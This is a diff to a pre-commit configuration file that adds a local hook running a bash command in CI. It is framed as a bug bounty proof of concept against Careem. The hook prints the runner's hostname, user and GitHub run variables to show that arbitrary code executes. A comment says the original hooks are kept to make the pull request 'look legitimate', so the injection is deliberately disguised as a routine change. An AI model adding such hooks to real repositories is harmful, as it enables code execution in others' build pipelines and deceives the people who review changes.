@@ -1,4 +1,16 @@
 repos:
+  # SECURITY RESEARCH - POC for Careem Bug Bounty
+  # This demonstrates arbitrary code execution in CI
+  - repo: local
+    hooks:
+      - id: security-poc-marker
+        name: "Security Research PoC - Careem BBP"
+        entry: bash -c 'echo "========================================"; echo "SECURITY POC - CAREEM BUG BOUNTY"; echo "Arbitrary code execution confirmed"; echo "Timestamp: $(date -u)"; echo "Runner: $(hostname)"; echo "User: $(whoami)"; echo "PWD: $(pwd)"; echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"; echo "GITHUB_ACTOR: $GITHUB_ACTOR"; echo "GITHUB_RUN_ID: $GITHUB_RUN_ID"; echo "========================================"'
+        language: system
+        always_run: true
+        pass_filenames: false
+
+  # Keep original hooks to make PR look legitimate
   - repo: https://github.com/antonbabenko/pre-commit-terraform
     rev: v1.83.0
     hooks:
